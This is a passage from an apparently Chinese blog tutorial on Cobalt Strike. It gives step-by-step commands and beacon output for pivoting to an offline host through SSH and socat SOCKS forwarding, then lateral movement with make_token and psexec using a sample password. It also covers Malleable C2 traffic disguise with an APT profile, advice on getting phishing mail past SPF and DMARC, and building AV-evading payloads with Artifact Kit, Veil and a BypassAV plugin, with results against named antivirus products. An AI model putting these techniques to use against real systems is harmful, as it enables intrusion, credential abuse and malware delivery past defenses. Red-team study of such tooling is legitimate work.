src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后生成一个 Windows 可执行文件，选择上一步生成的监听器，如果目标是 64 位则勾选使用 x64 Payload 的选项。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>之后将该可执行文件在目标主机上执行即可，在现实环境中可以尝试使用钓鱼邮件的方式诱导目标执行。</p><p>当目标执行该文件后，就会发现当前不出网的 192.168.232.132 主机已经上线了。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs21-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>有一说一，关于这部分网上大部分教程还是 CS 3.x 版本的教程，而在 4.0 的操作中个人感觉要方便很多。</p><p>网上关于这部分内容的 CS 4.0 的教程真的是少之又少，一开始在参考 3.x 教程的时候踩了很多坑，最后终于某内部知识库发现了一篇关于这部分内容的 4.0 教程，在该教程的参考下才发现居然如此简单。</p><h2 id="3、通过-SSH-开通通道"><a href="#3、通过-SSH-开通通道" class="headerlink" title="3、通过 SSH 开通通道"></a>3、通过 SSH 开通通道</h2><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>1、连接到上图中蓝色区域里的 PIVOT 主机并开启端口转发</p><pre class="line-numbers language-none"><code class="language-none">ssh -D 1080 user@&lt;blue pivot&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>该命令中的 -D 参数会使 SSH 建立一个 socket，并去监听本地的 1080 端口，一旦有数据传向那个端口，就自动把它转移到 SSH 连接上面，随后发往远程主机。</p></blockquote><p>2、在红色区域的 PIVOT 主机上开启通过 SSH Socks 的 445 端口转发</p><pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:&lt;target&gt;:445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>socat 可以理解成 netcat 的加强版。socat 建立 socks 连接默认端口就是 1080 ，由于我们上面设置的就是 1080，因此这里不需变动。如果设置了其他端口，那么这里还需要在命令最后加上 <code>,socksport=&lt;port&gt;</code> 指定端口才行。</p></blockquote><p>3、在攻击者控制的主机上运行 beacon，使其上线</p><pre class="line-numbers language-none"><code class="language-none">注意需要使用 administrator 权限运行 beacon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>4、在上线的主机上运行以下命令</p><pre class="line-numbers language-none"><code class="language-none">make_token [DOMAIN\user] [password]jump psexec_psh &lt;red pivot&gt; [listener]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>整体的流程就是下面这张图一样。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><strong>演示</strong></p><p>我在本地搭建了这样的一个环境。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><ol><li>首先使 Win1 主机上线，接着在 Linux1 主机上通过 SSH 连接到 Linux2 主机。</li></ol><pre class="line-numbers language-none"><code class="language-none">ssh -D 1080 user@192.168.175.146<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">> ssh <span class="token operator">-</span>D 1080 user@192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>146user@192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>146's password: Last login: Fri Jul 31 20:00:54 2020 <span class="token keyword">from</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>1user@ubuntu:~$ <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>2、在 Linux1 主机上开启 445 端口转发</p><pre class="line-numbers language-none"><code class="language-none">socat TCP4-LISTEN:445,fork SOCKS4:127.0.0.1:192.168.232.132:445<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、在 Win1 主机上运行以下命令使 Win2 上线</p><pre class="line-numbers language-none"><code class="language-none">make_token teamssix\administrator Test123!jump psexec_psh 192.168.175.200 smb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> make_token teamssix\administrator Test123<span class="token operator">!</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to create a token <span class="token keyword">for</span> teamssix\administrator<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 61 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> Impersonated WINTEST\Administratorbeacon> jump psexec_psh 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200 smb<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run windows<span class="token operator">/</span>beacon_bind_pipe <span class="token punctuation">(</span>\\<span class="token punctuation">.</span>\pipe\msagent_532c<span class="token punctuation">)</span> on 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200 via Service Control Manager <span class="token punctuation">(</span>PSH<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 5886 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:Started service 4aea3b9 on 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 204473 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> established link to child beacon: 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、随后便可以看到通过 SSH 上线的主机</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs22-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h1 id="0x08-Malleable-C2"><a href="#0x08-Malleable-C2" class="headerlink" title="0x08 Malleable C2"></a>0x08 Malleable C2</h1><h2 id="1、Malleable-命令和控制"><a href="#1、Malleable-命令和控制" class="headerlink" title="1、Malleable 命令和控制"></a>1、Malleable 命令和控制</h2><p>Malleable 是一种针对特定领域的语言，主要用来控制 Cobalt Strike Beacon</p><p>在开启 teamserver 时，在其命令后指定配置文件即可调用，比如：</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver [ip address] [password] [profile]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="2、设置和使用"><a href="#2、设置和使用" class="headerlink" title="2、设置和使用"></a>2、设置和使用</h2><p><strong>定义事务指标</strong></p><pre class="line-numbers language-none"><code class="language-none">http-get &#123;# 指标&#125;http-post &#123;# 指标&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>控制客户端和服务端指标</strong></p><pre class="line-numbers language-none"><code class="language-none">http-get &#123;client &#123;# 指标&#125;server &#123;# 指标&#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>set  操作</strong></p><p>set 语句是给一个选项赋值的方法，以分号结束。</p><pre class="line-numbers language-none"><code class="language-none">set useragent &quot;Mozilla&#x2F;5.0 (compatible; MSIE 8.0; Windows NT 5.1)&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>malleable 给了我们很多选项，比如：</p><pre class="line-numbers language-none"><code class="language-none">jitter# 控制 beacon 默认回连的抖动因子maxdns# 控制最大 DNS 请求，限制最大数量可以使 DNS Beacon 发送数据看起来正常些sleeptime# 控制 beacon 的全部睡眠时间spawntouriuseragent# 控制每次发送请求的 useragent<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>sleeptime</code> 和 <code>jitter</code> 两个选项是很重要的</p><p><strong>添加任意 headers</strong></p><pre class="line-numbers language-none"><code class="language-none">header &quot;Accept&quot; &quot;text&#x2F;html,application&#x2F;xhtml&quot;;header &quot;Referer&quot; &quot;https:&#x2F;&#x2F;www.google.com&quot;;header &quot;Progma&quot; &quot;no-cache&quot;;header &quot;Cache-Control&quot; &quot;no-cache&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>其他指标</strong></p><pre class="line-numbers language-none"><code class="language-none">header &quot;header&quot; &quot;value&quot;;parameter &quot;key&quot; &quot;value&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>转换/存储数据</strong></p><pre class="line-numbers language-none"><code class="language-none">metadata &#123;    netbios;    append &quot;-.jpg&quot;;    uri-append;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs23-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs23-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h2 id="3、配置语言"><a href="#3、配置语言" class="headerlink" title="3、配置语言"></a>3、配置语言</h2><pre class="line-numbers language-none"><code class="language-none">append &quot;string&quot;base64netbiosnetbiosuprepend &quot;string&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4、测试配置文件"><a href="#4、测试配置文件" class="headerlink" title="4、测试配置文件"></a>4、测试配置文件</h2><p>在GitHub 上有一些配置文件的示例，项目地址：<a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></p><p>这一节将使用该项目中的 <code>Malleable-C2-Profiles/APT/havex.profile</code> 配置文件作为示例。</p><p><strong>测试配置文件是否有效</strong></p><p>可以使用 c2lint 工具对配置文件进行测试，以判断配置文件编写的是否有效。</p><p>来到 cobalt strike 目录下，可以看到有一个 c2lint 文件，该文件需要在 Linux 下运行。</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;c2lint [profile]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在运行的结果中，绿色正常（这里更像青色），黄色告警，红色错误，比如运行 <code>Malleable-C2-Profiles</code> 项目里的 <code>havex.profile</code> 文件。</p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;c2lint .&#x2F;Malleable-C2-Profiles&#x2F;APT&#x2F;havex.profile<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs24-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>当配置文件存在错误的时候，就会以红色显示出来</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs24-2.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p><strong>运行 teamserver</strong></p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;teamserver [teamserver_ip] [teamserver_password] [profile]<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; .&#x2F;teamserver 192.168.12.2 password .&#x2F;Malleable-C2-Profiles&#x2F;APT&#x2F;havex.profile[*] Will use existing X509 certificate and keystore (for SSL)Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings&#x3D;on -Dswing.aatext&#x3D;true[+] I see you&#39;re into threat replication. .&#x2F;Malleable-C2-Profiles&#x2F;APT&#x2F;havex.profile loaded.[+] Team server is up on 50050<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里调用的 havex.profile 配置文件，该配置文件里对 cookie 进行了 base64 编码。</p><p>开启 cobalt strike 后，使主机上线，通过 wireshark 抓包可以发现数据包确实符合这些特征。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs24-3.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>关于 Malleable C2 文件的使用，这里只是大概记录了一些，想了解更多关于 Malleable C2 文件的内容或者注意事项等，可以参考 A-TEAM 团队的 CS 4.0 用户手册。</p><h1 id="0x09-免杀"><a href="#0x09-免杀" class="headerlink" title="0x09 免杀"></a>0x09 免杀</h1><p>Cobalt Strike 不是什么工作情况都能胜任的工具，因此就需要我们根据不同的情况去做一些辅助工作。</p><h2 id="1、DKIM、SPF-和-DMARC"><a href="#1、DKIM、SPF-和-DMARC" class="headerlink" title="1、DKIM、SPF 和 DMARC"></a>1、DKIM、SPF 和 DMARC</h2><p>SPF、DKIM、DMARC 都是邮件用于帮助识别垃圾信息的附加组件，那么作为一个攻击者，在发送钓鱼邮件的时候，就需要使自己的邮件能够满足这些组件的标准，或者发送到未配置这些组件的域。</p><p>在理解这些防御标准前，需要先理解如何在因特网上通过 SMTP 发送邮件。</p><p><strong>SMTP</strong></p><p>发送一封邮件的过程大概是下面这个样子，这里以QQ邮箱为例。</p><pre class="line-numbers language-none"><code class="language-none">&gt; telnet smtp.qq.com 25HELO teamssixauth loginbase64编码后的邮箱名base64编码后的授权码MAIL FROM: &lt;evil_teamssix@qq.com&gt;RCPT TO: &lt;target_teamssix@qq.com&gt;DATA邮件内容.QUIT<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>防御策略</strong></p><h3 id="DKIM"><a href="#DKIM" class="headerlink" title="DKIM"></a>DKIM</h3><p>DKIM <code>DomainKeys Identified Mail</code> 域名密钥识别邮件，DKIM 是一种防范电子邮件欺诈的验证技术，通过消息加密认证的方式对邮件发送域名进行验证。</p><p>邮件接收方接收邮件时，会通过 DNS 查询获得公钥，验证邮件 DKIM 签名的有效性，从而判断邮件是否被篡改。</p><h3 id="SPF"><a href="#SPF" class="headerlink" title="SPF"></a>SPF</h3><p>SPF <code>Sender Policy Framework</code> 发送人策略框架，SPF 主要用来防止随意伪造发件人。其做法就是设置一个 SPF 记录，SPF 记录实际上就是 DNS 的 TXT 记录。</p><p>如果邮件服务器收到一封来自 IP 不在 SPF 记录里的邮件则会退信或者标记为垃圾邮件。</p><p>我们可以使用以下命令查看目标的 SPF 记录。</p><pre class="line-numbers language-none"><code class="language-none">dig +short TXT target.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; dig +short TXT qq.com&quot;v&#x3D;spf1 include:spf.mail.qq.com -all&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的 <code>include:spf.mail.qq.com</code> 表示引入<code>spf.mail.qq.com</code>域名下的 SPF 记录。</p><pre class="line-numbers language-none"><code class="language-none">&gt; dig +short TXT spf-a.mail.qq.com&quot;v&#x3D;spf1 ip4:203.205.251.0&#x2F;24 ip4:103.7.29.0&#x2F;24 ip4:59.36.129.0&#x2F;24 ip4:113.108.23.0&#x2F;24 ip4:113.108.11.0&#x2F;24 ip4:119.147.193.0&#x2F;24 ip4:119.147.194.0&#x2F;24 ip4:59.78.209.0&#x2F;24 ip4:113.96.223.0&#x2F;24 ip4:183.3.226.0&#x2F;24 ip4:183.3.255.0&#x2F;24 ip4:59.36.132.0&#x2F;24 -all&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>上面的 <code>ip4:203.205.251.0/24 ip4:103.7.29.0/24</code> 表示只允许这个范围内的 IP 发送邮件。</p><h3 id="DMARC"><a href="#DMARC" class="headerlink" title="DMARC"></a>DMARC</h3><p>DMARC <code>Domain-based Message Authentication, Reporting &amp; Conformance</code> 基于域的消息认证，报告和一致性。</p><p>它用来检查一封电子邮件是否来自所声称的发送者。DMARC 建立在 SPF 和 DKIM 协议上, 并且添加了域名对齐检查和报告发送功能。这样可以改善域名免受钓鱼攻击的保护。</p><p>可以使用下面的命令查看目标的的 DMARC 记录。</p><pre class="line-numbers language-none"><code class="language-none">dig +short TXT _dmarc.target.com<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">&gt; dig +short TXT _dmarc.qq.com&quot;v&#x3D;DMARC1; p&#x3D;none; rua&#x3D;mailto:mailauth-reports@qq.com&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>也有一些在线网站支持检测 SPF、DKIM、DMARC 的记录，比如 <a href="https://dmarcly.com/tools/">https://dmarcly.com/tools/</a></p><p>关于这些记录查询返回结果的解释可参考文章末的参考链接。</p><p><strong>发送钓鱼邮件的一些注意事项</strong></p><p>1、检测目标是否有 SPF 记录，如果有则可能会被拦截</p><p>2、检测目标 DMARC 记录的 p 选项是否为 reject ，如果有则可能会被拒绝</p><p>3、模板中嵌入的 URL 地址，不要使用 IP 地址，要保证使用完整的 URL地址</p><p>4、邮件的附件中不能附上一些可执行文件，比如 exe 格式的文件，因为一些邮件过滤器可能会将这些可执行文件删除</p><h2 id="2、杀毒软件"><a href="#2、杀毒软件" class="headerlink" title="2、杀毒软件"></a>2、杀毒软件</h2><p>这一节将来看看杀毒软件相关的概念，毕竟知己知彼才能百战不殆，最后会介绍一下常见的免杀方法。</p><p>常规杀毒软件的目的就是发现已知病毒并中止删除它，而作为攻击者则需要对病毒文件进行免杀处理，从而使杀毒软件认为我们的文件是合法文件。</p><p><strong>杀软受到的限制</strong></p><p>1、杀毒软件不能把可疑文件删除或者结束运行，否则用户的正常操作可能就会受到影响，同时也会对杀毒软件公司的声誉、口碑产生影响。</p><p>2、杀毒软件不能占用太多的系统资源，否则用户可能会考虑卸载杀毒软件。</p><p>3、大多数杀毒软件的一个弱点就是只会在浏览器下载文件或者文件被写入磁盘时才会检查这个文件的特征码，也就是说在这种情况下才会检查文件是否是病毒。</p><p><strong>如何工作</strong></p><p>1、在大多数杀毒软件背后都会有一个已知病毒的签名数据库，通过将当前文件的特征码与病毒签名数据库进行比对，如果一致则说明该文件是病毒。</p><p>2、同时一些杀毒软件也会去发现用户的一些可疑行为，而且杀毒软件对这种可疑行为的判定会下比较大的功夫。因为如果误杀，造成的后果可能对用户来说是比较严重的。</p><p>3、一些杀毒软件会在沙箱环境中去运行可疑文件，然后根据该可疑文件的行为判断是否为病毒。</p><h3 id="如何免杀"><a href="#如何免杀" class="headerlink" title="如何免杀"></a>如何免杀</h3><p>首先要判断目标使用了哪款杀毒软件，然后自己在虚拟机中去尝试绕过它。</p><p>其次可以使用 Cobalt Strike 的 Artifact Kit 组件制作免杀可执行文件。Artifact Kit 是一个制作免杀 EXE、DLL 和 Service EXE 的源代码框架，在 Cobalt Strike 的 <code>Help --&gt; Arsenal</code> 处可下载 Artifact Kit。</p><p>Artifact Kit 的工作原理大概如下：</p><p>1、将病毒文件进行混淆处理，使杀毒软件将其判定为可疑文件而不是病毒文件。这种混淆可以逃避那些使用简单字符串搜索来识别恶意代码的杀毒软件。</p><p>2、对病毒文件进行一些处理，以绕过沙箱检测。比如 Artifact Kit 中的 src-common/bypass-pipe.c 会生成可执行文件和DLL，它们通过命名管道为自己提供shellcode。如果防病毒沙箱不能模拟命名管道，它将找不到已知的恶意 shellcode。</p><p>Artifact Kit 的使用步骤大概如下：</p><p>1、下载 Artifact Kit </p><p>2、如果需要的话就修改/混淆病毒文件 </p><p>3、构建</p><p>4、使用 Artifact Kit 加载脚本</p><h3 id="Artifact-Kit"><a href="#Artifact-Kit" class="headerlink" title="Artifact Kit"></a>Artifact Kit</h3><p>首先来看看未进行免杀处理的效果，这里采用 <a href="https://www.virustotal.com/">virustotal</a> 进行检测，发现被 42 个引擎检测到。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-6.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>接下来就试试 Artifact Kit 进行免杀的效果，有条件的可以去官网下载支持一下正版。</p><p>当然 Github 上也有人上传了，项目地址：<a href="https://github.com/Cliov/Arsenal">https://github.com/Cliov/Arsenal</a></p><p>这里使用 Artifact Kit 中的 dist-peek 方法进行测试。</p><p>来到 Cobalt Strike 下打开 <code>Cobalt Strike -&gt; Script Manager</code>，Load 加载 <code>/Arsenal/artifact/dist-peek/artifact.cna</code> 插件，之后在 <code>Attacks -&gt; Packages -&gt; Windows Executable</code> 中生成木马文件。</p><p>使用 VT 检测发现仅有 8 个引擎检测到，感觉效果好像还行。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-9.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>把每个杀软的病毒库升级到最新后，实测可以过腾讯电脑管家、火绒，但 360 安全卫士 、 360 杀毒不行。</p><blockquote><p>说句题外话，至于为什么用了两款 360 的产品，主要就是为了截图好看些。</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-10.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="Veil-Evasion"><a href="#Veil-Evasion" class="headerlink" title="Veil Evasion"></a>Veil Evasion</h3><p>此外，也可以使用 Veil Evasion 框架，Veil Evasion 的安装也是比较简单的，Veil-Evasion 在 Kali 2020以前是自带的，但 Kali 2020 中是需要独立安装的。在 Kali 中可以直接使用 apt-get 进行安装。</p><pre class="line-numbers language-none"><code class="language-none">git config --global http.proxy &#39;socks5:&#x2F;&#x2F;127.0.0.1:1080&#39;git config --global https.proxy &#39;socks5:&#x2F;&#x2F;127.0.0.1:1080&#39;apt-get install veil-evasionveil<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他系统可以使用 veil-evasion 项目中的介绍进行安装，项目地址：<a href="https://github.com/Veil-Framework/Veil-Evasion">https://github.com/Veil-Framework/Veil-Evasion</a></p><p>由于 Veil Evasion 有 200 多 M ，因此建议挂上代理进行下载安装。</p><p>安装完成之后，在 Cobalt Strike 里的 <code>Attacks -&gt; Packages -&gt; Payload Generator</code>  中选择 Veil 输出生成一个 payload.txt 文件</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>随后来到 Kali 下，输入 <code>veil</code> 启动，输入 <code>use Evasion</code> 使用 Evasion 工具，<code>list</code> 查看当前可用的 Payload</p><pre class="line-numbers language-none"><code class="language-none">veiluse Evasionlist<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这里使用第 17 个即 <code>go/shellcode_inject/virtual.py</code> Payload 作为示例，因为 go、c 等编译性语言语言相对于 python 等脚本语言来说免杀效果会好些。</p><pre class="line-numbers language-none"><code class="language-none">use 17<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后输入 <code>generate</code>，选择第三项 <code>Custom shellcode string</code> ，粘贴刚生成的 payload.txt 文本内容，输入要生成的 exe 文件名，即可生成一个免杀木马。</p><pre class="line-numbers language-none"><code class="language-none">generate3粘贴 payload.txt 内容bypass_go#生成文件的名称<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-4.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>使用 virustotal 查杀了一下生成的 bypass_go.exe，发现被 40 个引擎检测到，不得不说这效果很一般。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-5.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>实测可以过360 安全卫士、 360 杀毒，但腾讯电脑管家、火绒不行。</p><blockquote><p>看到 VT 的检测结果后，我还以为四款杀软都能检测到呢，没想到啊。</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-11.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><h3 id="免杀插件"><a href="#免杀插件" class="headerlink" title="免杀插件"></a>免杀插件</h3><p>后来又在 GitHub 上发现一款免杀插件，2 个月前更新的，项目地址：<a href="https://github.com/hack2fun/BypassAV">https://github.com/hack2fun/BypassAV</a></p><p>使用方法可以参考项目中的介绍，目前效果感觉还是可以的，在 virustotal 上只被 10 个引擎检测到。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-7.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>实测可以过 360 安全卫士、360 杀毒、腾讯电脑管家，但火绒不行。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs25-8.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>在测试完成之后，开始体会到为什么要判断目标使用了哪款杀软的目的了，就上面测试的情况来说，每一家都出现未检测到的情况。在实际的环境中，还是要根据目标的具体情况具体分析。</p><blockquote><p>Emm，浏览器首页又被 360 改成 360 导航了。</p><p>另外不得不说一句，从使用的角度来说，火绒是这里面最乖的，没有其他杀毒软件那么多花花肠子。</p></blockquote><p><strong>补充</strong></p><p>进行云查杀的一些情况：</p><p>1、首先判断文件是否为正常文件</p><p>2、如果判断为可疑文件，则把文件的 hash 上传到云上</p><p>3、同时把这个文件标记为可疑文件，而不是正常文件</p><p>因此可以通过修改我们的脚本来使其跳过云查杀，就像是在白名单里的程序一样。</p><h3 